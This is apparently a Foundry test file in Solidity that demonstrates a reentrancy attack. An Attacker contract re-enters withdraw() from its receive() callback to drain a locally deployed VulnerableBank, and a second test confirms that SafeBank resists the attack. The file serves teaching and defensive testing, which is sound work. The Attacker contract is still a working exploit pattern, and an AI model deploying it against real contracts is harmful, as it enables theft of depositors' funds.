// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2 as console} from "forge-std/Test.sol";
import {VulnerableBank, SafeBank} from "../src/Bank.sol";

/**
 * Minimal bank interface used by attacker
 */
interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

/**
 * Attacker contract (kept inside test file for convenience).
 *
 * - deposit small amount then call withdraw()
 * - reenter in receive() until drained or hop limit hit
 */
contract Attacker {
    IBank public bank;
    uint256 public reenterTimes;
    uint256 public maxHops = type(uint256).max;
    uint256 private _hop;

    constructor(address _bank) {
        bank = IBank(_bank);
    }

    /// @notice Start the attack by depositing msg.value then calling withdraw
    function attack() external payable {
        require(msg.value > 0, "need ether");
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    /// @notice Receive callback used to reenter bank.withdraw()
    receive() external payable {
        reenterTimes++;

        // Continue reentering while bank has at least the originally
        // deposited amount and we haven't exceeded hops.
        if (address(bank).balance >= msg.value && _hop < maxHops) {
            _hop++;
            bank.withdraw();
        }
    }
}

/**
 * Foundry test contract
 */
contract BankTest is Test {
    VulnerableBank bank;
    SafeBank sbank;
    Attacker attacker;

    address alice = address(0xA11CE);
    address bob   = address(0xB0B);
    address eve   = address(0xEEE); // EOA used to trigger attack

    function setUp() public {
        bank  = new VulnerableBank();
        sbank = new SafeBank();

        // Fund test EOAs
        vm.deal(alice, 10 ether);
        vm.deal(bob,   5 ether);
        vm.deal(eve,  2 ether); // give eve enough to call attack

        // Prepare VulnerableBank pool (Alice + Bob deposit)
        vm.startPrank(alice);
        bank.deposit{value: 10 ether}();
        vm.stopPrank();

        vm.startPrank(bob);
        bank.deposit{value: 5 ether}();
        vm.stopPrank();

        // Deploy Attacker pointing to VulnerableBank
        attacker = new Attacker(address(bank));

        // Option A (recommended): seed attacker contract by directly setting its balance
        // This avoids any subtlety in "from which account the value is taken".
        // Uncomment this if you want attacker contract to start with some ETH.
        vm.deal(address(attacker), 0); // optional no-op; show intent
    }

    function test_Reentrancy_Exploit() public {
        uint256 bankBefore = address(bank).balance;
        assertEq(bankBefore, 15 ether, "bank pool not prepared");

        // Directly call attack() from EOA with value (preferred)
        vm.startPrank(eve);
        attacker.attack{value: 1 ether}();
        vm.stopPrank();

        console.log("Reenter times:", attacker.reenterTimes());

        uint256 bankAfter = address(bank).balance;
        uint256 attackerBal = address(attacker).balance;

        console.log("bankBefore:", bankBefore);
        console.log("bankAfter :", bankAfter);
        console.log("attacker  :", attackerBal);

        // Attacker should have profited (more than the 1 ether it deposited).
        assertGt(attackerBal, 1 ether, "attacker did not profit");

        // Bank should have been significantly drained.
        assertLt(bankAfter, bankBefore - 1 ether, "bank not drained enough");
    }

    function test_SafeBank_NoReentrancy() public {
        // Prepare SafeBank pool
        vm.startPrank(alice);
        sbank.deposit{value: 10 ether}();
        vm.stopPrank();

        vm.startPrank(bob);
        sbank.deposit{value: 5 ether}();
        vm.stopPrank();

        // Deploy an attacker pointing at SafeBank
        Attacker fakeAttacker = new Attacker(address(sbank));

        // Give eve enough balance (done in setUp). Now call attack from eve with value.
        vm.startPrank(eve);
        fakeAttacker.attack{value: 1 ether}();
        vm.stopPrank();

        // SafeBank should keep funds intact; attacker cannot profit illicitly.
        assertEq(address(sbank).balance, 15 ether, "safe bank should keep funds");
        assertEq(address(fakeAttacker).balance, 1 ether, "no illicit profit");
    }
}
